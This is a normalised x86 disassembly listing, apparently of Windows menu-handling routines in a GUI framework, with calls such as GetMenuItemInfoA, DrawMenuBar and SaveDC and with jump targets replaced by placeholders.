mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_453114
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_452880
mov ebx eax
xor edx edx
mov eax edi
call sub_452d7c
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_4521e8
mov eax [ esi + 0x34 ]
call sub_4521e8
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_450124
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_446450
push eax
call DrawMenuBar
sub_4532bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_4532bc
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_4533e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_453114
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4521e8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4532ac
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_453410
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_428e44
xor eax eax
push ebp
push sub_45350e
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_428e44
xor eax eax
push ebp
push sub_4534e3
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4532bc
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_428e3c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453515
mov eax [ rw-data ]
call sub_428e3c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_453114
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_453534
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4538b8
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4538b8
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_4535f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_453b8c
mov eax ebx
call sub_408a68
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_453690
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_4535f0
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4041b0
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404400
lea edx [ ebp - 0x200 ]
call sub_408b2c
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_453724
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_453794
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_453c34
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_453c34
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_453c34
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_4537a0
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_453690
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_453724
mov eax ebx
call sub_453c58
jmp r-xdata
sub_453808
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_453850
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44da80
mov eax ebx
call sub_453064
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44dac4
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41e7a8
sub_45388c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41e9f4
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_453850
sub_4538d0
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453114
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_453114
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_457500
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_45392c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_453a01
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453114
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_453114
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_451cc0
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451cd0
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404128
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404128
mov eax [ ebp - 0xc ]
pop edx
call sub_4080b0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_454778
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453a08
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f64
retn
sub_453a14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4538d0
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45392c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_453b8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_453298
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_453114
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_453114
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408b0c
mov eax [ ebp + 0x10 ]
call sub_408a50
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_453c58
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43ca3c
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_453c34
mov [ ebx + 0x41 ] 0x1
sub_453c80
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_453c34
mov [ ebx + 0x41 ] 0x1
sub_453d0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_453808
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_453690
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_453d9c
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_453dd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453e02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453e24
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454357
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45435e
lea eax [ ebp - 0x30 ]
call sub_403f40
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edx [ esi + 0x4 ]
call sub_4531d0
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_460c08
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov dx [ esi + 0x4 ]
call sub_4531b4
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45418a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45416d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_422a70
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4228ec
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4545fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454174
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_422a70
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_453a14
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_453114
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_453114
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_4542cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_422348
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4542a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45428b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_422a70
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4228ec
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454292
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_422a70
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43ccc0
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460c08
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_453114
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_453114
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_453114
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_453144
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417e94
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_453144
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_4608ac
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_460914
jmp r-xdata
sub_4542af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_454368
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_417d38
pop esi
pop ebx
retn
push ebx
push sub_453dd8
call sub_41f824
mov [ ebx + 0x10 ] eax
sub_4543ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_452f2c
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
